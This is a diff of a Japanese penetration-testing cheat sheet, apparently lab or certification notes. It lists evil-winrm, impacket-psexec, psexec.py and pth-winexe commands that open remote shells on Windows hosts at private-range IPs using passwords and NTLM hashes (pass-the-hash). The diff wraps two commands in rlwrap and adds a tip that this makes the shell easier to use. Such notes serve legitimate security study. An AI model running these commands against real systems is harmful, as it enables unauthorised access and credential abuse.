@@ -183,12 +183,14 @@ evil-winrm -i 10.11.1.121 -u sqlServer -p shantewhite
 
 evil-winrm -u Administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e  -i 192.168.177.10
 
-impacket-psexec alice:ThisIsTheUsersPassword01@10.11.1.50 cmd.exe
+rlwrap impacket-psexec alice:ThisIsTheUsersPassword01@10.11.1.50 cmd.exe
 
-psexec.py Administrator@10.10.3.190 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
+rlwrap psexec.py Administrator@10.10.3.190 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
 
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
 ```
+
+**rlwrap**をつけてシェルをつかいやすく。
 
 **パスワード合ってるはずなのに入れない場合は”ドメイン”を指定せよ！**（rdesktopの`-d`とか）
 
